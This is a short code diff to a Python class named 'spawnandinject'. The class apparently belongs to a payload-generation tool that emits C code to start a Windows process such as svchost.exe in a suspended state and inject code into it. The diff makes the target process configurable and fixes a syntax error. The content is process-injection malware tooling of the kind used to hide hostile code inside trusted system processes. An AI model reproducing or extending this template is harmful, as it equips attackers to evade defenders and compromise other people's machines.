@@ -3,8 +3,12 @@ class spawnandinject:
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
-            else
+            else:
                 self.memoryPermission = 'PAGE_EXECUTE_READ'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
+        else:
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -38,7 +42,7 @@ int main()
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
